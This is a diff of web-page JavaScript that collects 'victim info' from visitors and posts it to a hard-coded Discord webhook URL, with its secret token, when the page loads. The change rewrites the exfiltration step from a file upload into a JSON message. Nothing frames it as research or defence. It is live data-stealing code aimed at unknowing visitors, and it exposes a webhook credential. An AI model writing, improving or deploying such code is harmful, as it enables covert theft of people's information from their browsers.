@@ -77,38 +77,36 @@
                     timestamp: new Date().toISOString()
                 };
 
-                // Create and send text file to webhook
-                await sendFileToWebhook(GG);
+                // Send to webhook
+                await sendToWebhook(victimInfo);
             } catch (error) {
                 console.error('Error collecting victim info:', error);
             }
         }
 
-        // Function to create and send text file to webhook
-        async function sendFileToWebhook(info) {
-            // Convert object to formatted text
-            const formattedText = JSON.stringify(info, null, 2);
-            
-            // Create blob and upload to webhook
-            const blob = new Blob([formattedText], { type: 'text/plain' });
-            
-            // Create FormData object and append the file
-            const formData = new FormData();
-            formData.append('file', blob, 'victim_info.txt');
-            
-            // Send to webhook
+        // Function to send data to webhook
+        async function sendToWebhook(info) {
             const webhookUrl = 'https://discord.com/api/webhooks/1461964964603625594/jH-XEtXJtxJm69mjlFViAi8BQWutT-P6wTioZ-tElKw3BlJihCEeuNB2AazCCIjgKQKU';
             
+            // Convert to text file content
+            const fileContent = JSON.stringify(info, null, 2);
+            
+            // Send to webhook
             const response = await fetch(webhookUrl, {
                 method: 'POST',
-                body: formData
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: fileContent
+                })
             });
 
             if (!response.ok) {
                 throw new Error(`Failed to send webhook: ${response.status}`);
             }
 
-            console.log('Victim info file sent to webhook');
+            console.log('Victim info sent to webhook');
         }
 
         // Call the function when the page loads
